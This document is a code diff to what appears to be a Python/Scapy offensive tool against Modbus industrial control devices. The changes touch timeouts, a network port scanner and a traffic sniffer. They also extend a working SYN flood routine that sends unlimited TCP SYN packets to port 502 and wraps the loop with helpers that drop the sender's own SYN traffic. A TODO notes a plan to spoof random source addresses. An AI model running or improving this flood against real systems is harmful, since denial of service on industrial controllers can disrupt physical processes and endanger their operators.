@@ -24,6 +24,8 @@ modport = 502
 iface = ""
 verbose = False
 transId = 1
+timeout = 60
+
 #Device Identification Object range
 MINOBJECTID = 1 # Start at 1
 MAXOBJECTID = 256 # Ends at 256
@@ -286,11 +288,13 @@ class SniffMB(threading.Thread):
 	"""
 	This class sniff traffic and initiate the reply
 	"""
-	def __init__(self, ip, timer = 20):
+	def __init__(self, ip, timer):
 		threading.Thread.__init__(self)
 		self._stopevent = threading.Event()
 		self.querys = {}
 		self.myReg = MBregisters(ip)
+		if timer is None:
+			timer = 20
 		self.timer = float(timer)
 
 	def run(self):
@@ -321,7 +325,6 @@ class SniffMB(threading.Thread):
 			self.querys[index] = pkt
 		elif ModbusADU_Response in pkt:
 			index = str(pkt[IP].dst) + " >> " + str(pkt[IP].src) + " [" + str(pkt[ModbusADU_Response].transId) + "]" + str(pkt.funcCode)
-			print index
 			
 			#If we do not have the query, we reject the packet
 			if self.querys[index] is None:
@@ -404,8 +407,7 @@ def scanNetwork(ipRange, timeout):
 		try:
 			# socket object instantiation
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			# set socket timeout, value from cmd is in mills
-			s.settimeout(float(timeout) / float(1000))			
+			s.settimeout(1)			
 
 			# connect requires ip addresses in string format so it must be cast
 			s.connect((str(ip), modport))
@@ -543,16 +545,22 @@ TCP SYN Flood
 def SYN_flood(ip, timeout):
 	global verbose, iface, modport, modport
 	
+	myIP = conf.route.route(ip)[1]
+
 	if verbose:
-		print "SYN Flooding " + str(ip) + " in progress..."
+		print "SYN Flooding " + str(ip) + " FROM " + str(myIP) + " in progress..."
 		print "  > Interrupt with Ctrl+c"
 
+	
+	dropSYN(myIP)
 	try:
 		while True:
+#TODO: Spoof ip source to random IP address (best if not existing)
 			p = IP(dst=str(ip))/TCP(sport=RandNum(1024, 65535), dport=modport, flags="S")
 			send(p, iface=iface, verbose=False)
 	except KeyboardInterrupt:
 		pass
+	restoreDropSYN(myIP)
 
 """
 Test malformated packet
